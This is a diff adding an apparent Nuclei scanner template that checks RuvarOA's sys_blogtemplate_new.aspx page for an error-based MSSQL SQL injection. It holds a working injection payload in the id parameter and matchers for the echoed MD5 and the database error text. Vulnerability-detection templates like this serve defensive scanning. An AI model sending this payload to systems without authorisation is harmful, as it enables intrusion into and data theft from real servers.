@@ -1,0 +1,31 @@
+id: poc-yaml-ruvaroa-sys-blogtemplate-new-sqli
+info:
+  name: RuvarOA sys_blogtemplate_new SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    RuvarOA sys_blogtemplate_new page is vulnerable to SQL injection, allowing attackers to execute arbitrary SQL queries.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /SysManage/sys_blogtemplate_new.aspx?id=(%28-1)+and+1=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--+%29 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "[Exception]:"
+          - "RuvarOA"
+          - "0x{{t2}}"
+          - "转换成数据类型 int 时失败"
